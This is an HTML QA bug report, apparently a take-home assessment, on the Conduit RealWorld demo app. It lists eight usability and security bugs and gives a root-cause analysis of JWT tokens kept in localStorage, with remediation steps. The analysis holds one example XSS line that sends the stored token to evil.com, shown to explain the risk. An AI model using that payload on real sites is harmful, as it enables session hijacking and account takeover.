@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Task1_QA_Report_Srimanth</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #1a1a2e;
+      background: #ffffff;
+      padding: 40px;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+
+    /* Header */
+    .report-header {
+      border-bottom: 3px solid #4f46e5;
+      padding-bottom: 20px;
+      margin-bottom: 30px;
+    }
+
+    .report-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #1a1a2e;
+      letter-spacing: -0.5px;
+    }
+
+    .report-subtitle {
+      font-size: 14px;
+      color: #6366f1;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+
+    .meta-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-top: 16px;
+    }
+
+    .meta-item {
+      background: #f8f7ff;
+      border: 1px solid #e0e0f5;
+      border-radius: 8px;
+      padding: 10px 14px;
+    }
+
+    .meta-label {
+      font-size: 10px;
+      font-weight: 600;
+      color: #6366f1;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .meta-value {
+      font-size: 13px;
+      font-weight: 500;
+      color: #1a1a2e;
+      margin-top: 2px;
+    }
+
+    /* Section titles */
+    h2 {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin: 28px 0 14px;
+      padding-bottom: 6px;
+      border-bottom: 2px solid #e5e5f0;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    h2 .section-num {
+      background: #4f46e5;
+      color: white;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+
+    h3 {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1a1a2e;
+      margin: 20px 0 8px;
+    }
+
+    p { margin-bottom: 10px; color: #374151; }
+
+    /* Severity badges */
+    .badge {
+      display: inline-block;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .badge-critical { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; }
+    .badge-high     { background: #ffedd5; color: #92400e; border: 1px solid #fdba74; }
+    .badge-medium   { background: #fef9c3; color: #854d0e; border: 1px solid #fde047; }
+    .badge-low      { background: #dcfce7; color: #166534; border: 1px solid #86efac; }
+
+    /* Bug cards */
+    .bug-card {
+      border: 1px solid #e5e7eb;
+      border-radius: 10px;
+      margin-bottom: 16px;
+      overflow: hidden;
+      page-break-inside: avoid;
+    }
+
+    .bug-card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      background: #fafafa;
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .bug-num {
+      background: #4f46e5;
+      color: white;
+      border-radius: 6px;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .bug-num.critical { background: #dc2626; }
+    .bug-num.high     { background: #ea580c; }
+    .bug-num.medium   { background: #ca8a04; }
+    .bug-num.low      { background: #16a34a; }
+
+    .bug-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1a1a2e;
+      flex: 1;
+    }
+
+    .bug-body {
+      padding: 14px 16px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .bug-field-label {
+      font-size: 10px;
+      font-weight: 600;
+      color: #6366f1;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 4px;
+    }
+
+    .bug-field-value {
+      font-size: 12px;
+      color: #374151;
+      line-height: 1.5;
+    }
+
+    .bug-field-full {
+      grid-column: 1 / -1;
+    }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      background: #f3f4f6;
+      border: 1px solid #e5e7eb;
+      border-radius: 4px;
+      padding: 0 5px;
+      color: #4f46e5;
+    }
+
+    pre {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      background: #1e1e2e;
+      color: #cdd6f4;
+      border-radius: 8px;
+      padding: 14px 16px;
+      margin: 10px 0;
+      overflow-x: auto;
+      line-height: 1.6;
+    }
+
+    /* RCA Section */
+    .rca-section {
+      background: linear-gradient(135deg, #fef2f2 0%, #fff5f5 100%);
+      border: 1px solid #fca5a5;
+      border-left: 4px solid #dc2626;
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 16px 0;
+    }
+
+    .rca-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #dc2626;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .impact-box {
+      background: #fef2f2;
+      border: 1px solid #fca5a5;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-top: 14px;
+    }
+
+    .impact-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #991b1b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .fix-box {
+      background: #f0fdf4;
+      border: 1px solid #86efac;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-top: 12px;
+    }
+
+    .fix-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #166534;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    ul {
+      padding-left: 18px;
+      margin: 6px 0;
+    }
+
+    ul li {
+      margin-bottom: 4px;
+      color: #374151;
+      font-size: 12px;
+    }
+
+    /* Footer */
+    .report-footer {
+      margin-top: 40px;
+      padding-top: 16px;
+      border-top: 1px solid #e5e7eb;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #9ca3af;
+      font-size: 11px;
+    }
+
+    @media print {
+      body { padding: 20px; }
+      .bug-card { page-break-inside: avoid; }
+      .rca-section { page-break-inside: avoid; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="report-header">
+    <div class="report-title">QA Bug Report — Conduit (RealWorld Demo)</div>
+    <div class="report-subtitle">Task 1 — Automation & QA Developer Take-Home Assessment</div>
+    <div class="meta-grid">
+      <div class="meta-item">
+        <div class="meta-label">Tester</div>
+        <div class="meta-value">Srimanth</div>
+      </div>
+      <div class="meta-item">
+        <div class="meta-label">Date</div>
+        <div class="meta-value">May 21, 2026</div>
+      </div>
+      <div class="meta-item">
+        <div class="meta-label">Application</div>
+        <div class="meta-value">demo.realworld.io</div>
+      </div>
+      <div class="meta-item">
+        <div class="meta-label">Tech Stack</div>
+        <div class="meta-value">Angular SPA + Node.js/Express</div>
+      </div>
+      <div class="meta-item">
+        <div class="meta-label">Testing Method</div>
+        <div class="meta-value">Manual Exploratory Testing</div>
+      </div>
+      <div class="meta-item">
+        <div class="meta-label">Total Issues Found</div>
+        <div class="meta-value">8 (1 Critical, 3 High, 3 Medium, 1 Low)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug Table Section -->
+  <h2><span class="section-num">1</span> Bug Report Table</h2>
+
+  <!-- Bug 1 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num high">1</div>
+      <div class="bug-title">Duplicate Username Error Shows as Generic Block — No Inline Field Feedback</div>
+      <span class="badge badge-high">High</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Register with username <code>testuser123</code> and valid email.<br>2. Log out.<br>3. Try registering again with same username, different email.<br>4. Click "Sign up".</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Inline error "Username is already taken" next to the username field with field highlighting.<br><strong>Actual:</strong> Generic error block at top of form — no field-level association.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">Frontend maps API <code>422</code> error keys to a flat <code>&lt;ul class="error-messages"&gt;</code> component. No field-level association between error keys and DOM input elements exists.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 2 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num high">2</div>
+      <div class="bug-title">Login Button Remains Active During Submission — Multiple Concurrent Requests Fire</div>
+      <span class="badge badge-high">High</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Go to <code>/login</code>.<br>2. Enter valid email + wrong password.<br>3. Click "Sign in" 3–4 times rapidly.</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Button disabled + spinner during API call.<br><strong>Actual:</strong> Multiple identical <code>POST /api/users/login</code> requests fire simultaneously (visible in Network tab).</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">No <code>isSubmitting</code> guard set before async API call. The button's <code>disabled</code> attribute is never toggled during form submission lifecycle.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 3 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num high">3</div>
+      <div class="bug-title">Article Editor Accepts Empty Title &amp; Body — Publishes Blank Articles</div>
+      <span class="badge badge-high">High</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Log in → navigate to <code>/editor</code>.<br>2. Leave Title and Body blank.<br>3. Fill only "About" and "Tags".<br>4. Click "Publish Article".</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Client-side validation blocks submission and highlights required fields.<br><strong>Actual:</strong> Article publishes with empty title — renders as a blank clickable link in global feed.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">Missing <code>required</code> HTML attribute and no JS pre-submit validation. Backend <code>/api/articles</code> endpoint also lacks server-side rejection of empty title/body strings.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 4 - Critical -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num critical">4</div>
+      <div class="bug-title">JWT Token Stored in localStorage — XSS Session Hijack Vulnerability</div>
+      <span class="badge badge-critical">Critical</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Log in.<br>2. Open DevTools → Application → Local Storage → <code>demo.realworld.io</code>.<br>3. Observe <code>jwtToken</code> key in plain text.<br>4. Run <code>localStorage.getItem('jwtToken')</code> in Console.</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Auth tokens stored in <code>HttpOnly</code> cookies, inaccessible to JS.<br><strong>Actual:</strong> JWT stored in <code>localStorage</code>, fully readable by any script on the page.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">Standard SPA anti-pattern — storing auth tokens in <code>localStorage</code> for simplicity. No CSP header. No <code>HttpOnly</code>/<code>Secure</code> cookie flags for session management.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 5 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num medium">5</div>
+      <div class="bug-title">Tag Input Adds Tags with Trailing Whitespace on Spacebar — Silent Invisible Duplicates</div>
+      <span class="badge badge-medium">Medium</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Log in → <code>/editor</code>.<br>2. Click "Enter tags" field.<br>3. Type <code>javascript</code> and press <strong>Space</strong>.</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Spacebar adds tag with visible feedback, or is explicitly unsupported.<br><strong>Actual:</strong> Tag added with trailing space — <code>"javascript "</code> ≠ <code>"javascript"</code> when filtering. Silent UX breakage.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">No <code>.trim()</code> call on tag strings before adding to <code>tagList</code> array. Tag input splits on Enter but does not sanitize whitespace.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 6 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num medium">6</div>
+      <div class="bug-title">"Your Feed" Shows Blank State for New Users — No Guidance or Call-to-Action</div>
+      <span class="badge badge-medium">Medium</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Register a brand-new account.<br>2. Navigate to Home page.<br>3. Click the "Your Feed" tab.</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Empty state with message "Follow some authors to see their articles here!" and a CTA.<br><strong>Actual:</strong> Completely blank white area — no text, no illustration, no guidance.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">Component renders an empty <code>&lt;div&gt;</code> when articles array is empty, without any conditional "empty state" branch in the template.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 7 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num medium">7</div>
+      <div class="bug-title">No Account Deletion Option — GDPR Article 17 (Right to Erasure) Compliance Risk</div>
+      <span class="badge badge-medium">Medium</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Log in.<br>2. Navigate to Settings (<code>/settings</code>).<br>3. Look for any account/data deletion option.</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> "Delete Account" option in Settings page.<br><strong>Actual:</strong> No way to delete account or personal data. Backend has no <code>DELETE /api/user</code> endpoint.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">Feature was never implemented in the RealWorld spec. Settings page was built without considering data lifecycle or GDPR compliance requirements.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bug 8 -->
+  <div class="bug-card">
+    <div class="bug-card-header">
+      <div class="bug-num low">8</div>
+      <div class="bug-title">Comment Field Has No Character Limit — Long Comments Break Layout on Narrow Viewports</div>
+      <span class="badge badge-low">Low</span>
+    </div>
+    <div class="bug-body">
+      <div>
+        <div class="bug-field-label">Steps to Reproduce</div>
+        <div class="bug-field-value">1. Log in → open any article.<br>2. Paste 5000+ characters into the comment box.<br>3. Click "Post Comment".</div>
+      </div>
+      <div>
+        <div class="bug-field-label">Expected vs Actual</div>
+        <div class="bug-field-value"><strong>Expected:</strong> Character counter with enforcement (e.g., max 1000 chars) or server-side rejection with clear error.<br><strong>Actual:</strong> Comment accepted regardless of length; distorts article layout on narrow viewports.</div>
+      </div>
+      <div class="bug-field-full">
+        <div class="bug-field-label">Suspected Cause</div>
+        <div class="bug-field-value">No <code>maxLength</code> attribute on the textarea and no server-side length validation in the comments API endpoint.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Root Cause Analysis -->
+  <h2><span class="section-num">2</span> Root-Cause Analysis — Bug #4: JWT Stored in localStorage</h2>
+
+  <div class="rca-section">
+    <div class="rca-title">🔴 Critical Security Vulnerability — XSS Session Hijack Risk</div>
+
+    <h3>What Is Happening</h3>
+    <p>When a user logs in, the server returns a JSON Web Token (JWT) inside the API response body. The Angular frontend stores this token in <code>localStorage</code> under the key <code>jwtToken</code>. On every subsequent authenticated API call, this token is retrieved from <code>localStorage</code> and attached as a Bearer token in the <code>Authorization</code> header.</p>
+
+    <h3>Why This Is Exploitable</h3>
+    <p><code>localStorage</code> is fully accessible to <strong>any JavaScript running on the same origin</strong>. If an attacker injects malicious JavaScript into the page (via XSS), they can steal the token with a single line:</p>
+    <pre>fetch('https://evil.com/steal?t=' + localStorage.getItem('jwtToken'));</pre>
+
+    <p>The Conduit app renders user-submitted Markdown as HTML. If the sanitization layer has any gap — common in vibe-coded apps — an attacker can craft an article with embedded JavaScript. Once viewed by any logged-in user, the payload fires, the JWT is exfiltrated, and the attacker gains full account access.</p>
+
+    <h3>The Correct Fix</h3>
+    <p>Store the JWT in an <strong>HttpOnly, Secure, SameSite=Strict cookie</strong>. The server sets this on the login response:</p>
+    <pre>Set-Cookie: token=&lt;JWT&gt;; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400</pre>
+    <p><code>HttpOnly</code> makes the cookie completely invisible to JavaScript — even a successful XSS attack cannot read it. The browser automatically attaches it to every same-origin request.</p>
+
+    <div class="fix-box">
+      <div class="fix-title">✅ Complete Remediation Plan</div>
+      <ul>
+        <li>Migrate JWT to <code>HttpOnly; Secure; SameSite=Strict</code> cookie on the backend</li>
+        <li>Remove all <code>localStorage.setItem/getItem</code> calls for auth tokens in the frontend</li>
+        <li>Implement a strict Content Security Policy (CSP) header blocking inline script execution</li>
+        <li>Add short token expiry (15 minutes) with silent refresh-token rotation</li>
+        <li>Audit all Markdown rendering paths for DOMPurify sanitization coverage</li>
+        <li>Add <code>X-Content-Type-Options: nosniff</code> and <code>X-Frame-Options: DENY</code> response headers</li>
+      </ul>
+    </div>
+
+    <div class="impact-box">
+      <div class="impact-title">⚠️ Business Impact</div>
+      <p style="font-size:12px; margin:0; color:#991b1b;">In production, this vulnerability would be rated <strong>Critical (CVSS 8.8+)</strong>. A single malicious article — published by any registered user and viewed by any other — could result in a mass account takeover. This would fail any standard penetration test or security audit.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="report-footer">
+    <div>Task 1 — Automation & QA Developer Take-Home Assessment</div>
+    <div>Tester: Srimanth | May 21, 2026 | demo.realworld.io</div>
+  </div>
+
+</body>
+</html>
